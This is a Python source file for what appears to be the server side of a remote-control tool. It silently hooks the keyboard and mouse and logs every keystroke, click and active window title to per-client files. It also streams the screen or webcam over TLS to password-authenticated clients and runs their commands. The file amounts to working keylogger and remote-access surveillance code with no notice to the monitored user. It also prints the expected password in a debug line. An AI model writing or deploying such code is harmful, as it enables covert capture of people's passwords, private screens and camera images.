import socket
import ssl
import cv2
import mss
import numpy as np
import pyautogui
import struct
import threading
import random
import logging
import string
import json
import subprocess
import time
import re
import sys
import ctypes
import datetime
from pathlib import Path
from pynput import keyboard, mouse
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from server.core.registry import CommandRegistry

class ControlServer:
    def __init__(self):
        self.host = '0.0.0.0'
        self.port_stream = 9998
        self.port_cmd = 9999
        self.password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        self.running = False
        self.is_streaming = False
        self.stream_mode = "SCREEN"
        self.is_recording = False
        self.recorder = None
        self.activity_logs = []
        self.last_window = ""
        self.active_clients_data = [] 
        self.client_lock = threading.Lock()
        self.log_dir = Path("history_log")
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.cert_dir = Path("resources/certs")
        self.cert_dir.mkdir(parents=True, exist_ok=True)
        self.cert_file = self.cert_dir / "server.crt"
        self.key_file = self.cert_dir / "server.key"
        self.start_listeners()
        threading.Thread(target=self._window_tracker, daemon=True).start()
        self.ssl_context = self.setup_ssl()
        try:
            w, h = pyautogui.size()
            self.native_res = (w, h) if w > 0 else (1280, 720)
        except Exception: self.native_res = (1280, 720)

    @property
    def active_clients(self):
        with self.client_lock: return [c['ip'] for c in self.active_clients_data]

    def log_event(self, msg):
        full_msg = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}"
        self.activity_logs.append(full_msg)
        with self.client_lock:
            for client in self.active_clients_data:
                try:
                    with open(client['log'], "a", encoding="utf-8") as f: f.write(full_msg + "\n")
                except: pass

    def get_active_window(self):
        try:
            if sys.platform == "win32":
                user32 = ctypes.windll.user32; hwnd = user32.GetForegroundWindow()
                length = user32.GetWindowTextLengthW(hwnd)
                if length > 0:
                    buf = ctypes.create_unicode_buffer(length + 1)
                    user32.GetWindowTextW(hwnd, buf, length + 1); return buf.value
            elif sys.platform == "linux":
                res = subprocess.check_output(['xprop', '-root', '_NET_ACTIVE_WINDOW'], stderr=subprocess.DEVNULL).decode()
                wid = res.split()[-1]
                if wid != "0x0":
                    res = subprocess.check_output(['xprop', '-id', wid, 'WM_NAME', '_NET_WM_NAME'], stderr=subprocess.DEVNULL).decode()
                    match = re.search(r' = "(.*)"', res)
                    if match: return match.group(1)
        except Exception: pass
        return "Unknown"

    def _window_tracker(self):
        while True:
            curr = self.get_active_window()
            if curr and curr != self.last_window:
                self.last_window = curr; self.log_event(f"[WINDOW CHANGED] Title: {curr}")
            time.sleep(1.0)

    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try: s.connect(('8.8.8.8', 1)); ip = s.getsockname()[0]
        except Exception: ip = '127.0.0.1'
        finally: s.close()
        return ip

    def setup_ssl(self):
        if not (self.cert_file.exists() and self.key_file.exists()): self.generate_certs(self.cert_file, self.key_file)
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file); return ctx

    def generate_certs(self, cp, kp):
        key = rsa.generate_private_key(65537, 2048)
        sub = iss = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, u"localhost")])
        now = datetime.datetime.now(datetime.timezone.utc)
        cert = (x509.CertificateBuilder().subject_name(sub).issuer_name(iss).public_key(key.public_key()).serial_number(x509.random_serial_number()).not_valid_before(now).not_valid_after(now + datetime.timedelta(days=365)).sign(key, hashes.SHA256()))
        with open(kp, "wb") as f: f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
        with open(cp, "wb") as f: f.write(cert.public_bytes(serialization.Encoding.PEM))

    def start_listeners(self):
        def op(k):
            try:
                char = k.char if hasattr(k, 'char') else str(k).replace("Key.", "")
                self.log_event(f"Key: {char}")
            except Exception: pass
        def oc(x, y, b, p):
            if p: self.log_event(f"Mouse Click: {b} at ({x}, {y})")
        self.kl = keyboard.Listener(on_press=op); self.kl.start()
        self.ml = mouse.Listener(on_click=oc); self.ml.start()

    def start(self):
        self.running = True
        threading.Thread(target=self.stream_loop, daemon=True).start()
        threading.Thread(target=self.command_loop, daemon=True).start()
        logging.info("Server started.")

    def stop(self):
        self.running = False
        with self.client_lock:
            for c in self.active_clients_data:
                try: c['conn'].close()
                except: pass
            self.active_clients_data.clear()
        if self.recorder: self.recorder.release()
        logging.info("Server stopped.")

    def stream_loop(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); raw.settimeout(1.0)
        try:
            raw.bind((self.host, self.port_stream)); raw.listen(10)
            while self.running:
                try:
                    c, _ = raw.accept(); sc = self.ssl_context.wrap_socket(c, server_side=True)
                    threading.Thread(target=self.handle_stream, args=(sc,), daemon=True).start()
                except socket.timeout: continue
        except Exception as e: logging.error(f"Stream Loop Error: {e}")
        finally: raw.close()

    def handle_stream(self, conn):
        cam = None
        with mss.mss() as sct:
            try:
                while self.running:
                    if self.stream_mode == "SCREEN":
                        if cam: cam.release(); cam = None
                        img = np.array(sct.grab(sct.monitors[1])); f = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    else:
                        if cam is None: cam = cv2.VideoCapture(0)
                        ret, f = cam.read()
                        if not ret: f = np.zeros((480, 640, 3), np.uint8)
                    if not self.is_streaming: time.sleep(0.5); continue
                    _, enc = cv2.imencode('.jpg', f, [cv2.IMWRITE_JPEG_QUALITY, 45])
                    b = enc.tobytes(); conn.sendall(struct.pack("!I", len(b)) + b)
            except Exception: pass
            finally: 
                conn.close()
                if cam: cam.release()

    def command_loop(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); raw.settimeout(1.0)
        try:
            raw.bind((self.host, self.port_cmd)); raw.listen(10)
            while self.running:
                try:
                    c, _ = raw.accept()
                    # Force immediate release when closed
                    c.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                    threading.Thread(target=self._auth_handler, args=(c,), daemon=True).start()
                except socket.timeout: continue
        except Exception as e: logging.error(f"Command Loop Error: {e}")
        finally: raw.close()

    def _auth_handler(self, raw_conn):
        conn = None
        try:
            conn = self.ssl_context.wrap_socket(raw_conn, server_side=True)
            self.handle_command(conn)
        except Exception:
            if conn: conn.close()
            else: raw_conn.close()

    def handle_command(self, conn):
        peer = "Unknown"; client_entry = None
        try: peer = conn.getpeername()[0]
        except: pass

        try:
            # Secure password receipt
            data = conn.recv(1024)
            if not data: return
            pwd = data.decode().strip()
            
            # CRITICAL DEBUG
            print(f"DEBUG: Auth attempt from {peer}. Received: [{pwd}], Expected: [{self.password}]")
            
            if pwd != self.password:
                logging.warning(f"Auth FAILED from {peer}")
                res = json.dumps({"status": "FAIL", "msg": "Invalid Password"}).encode()
                conn.sendall(struct.pack("!I", len(res)) + res); return

            # Auth success
            log_name = f"log_{peer}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
            log_path = self.log_dir / log_name
            client_entry = {"ip": peer, "log": str(log_path), "conn": conn}
            with self.client_lock: self.active_clients_data.append(client_entry)
            self.log_event(f"--- Session Started for {peer} ---")

            res = json.dumps({"status": "OK", "w": self.native_res[0], "h": self.native_res[1]}).encode()
            conn.sendall(struct.pack("!I", len(res)) + res)

            while self.running:
                h = conn.recv(4)
                if not h: break
                sz = struct.unpack("!I", h)[0]; req = b""
                while len(req) < sz:
                    ch = conn.recv(min(sz - len(req), 8192))
                    if not ch: break
                    req += ch
                if not req: break
                data = json.loads(req.decode())
                command = CommandRegistry.get(data['type'])
                if command: command.execute(self, conn, data)
        except Exception: pass
        finally:
            with self.client_lock:
                if client_entry is not None and client_entry in self.active_clients_data:
                    self.active_clients_data.remove(client_entry)
            self.log_event(f"--- Session Ended for {peer} ---")
            try:
                conn.shutdown(socket.SHUT_RDWR)
                conn.close()
            except: pass

    def send_json(self, conn, data):
        p = json.dumps(data).encode('utf-8')
        conn.sendall(struct.pack("!I", len(p)) + p)
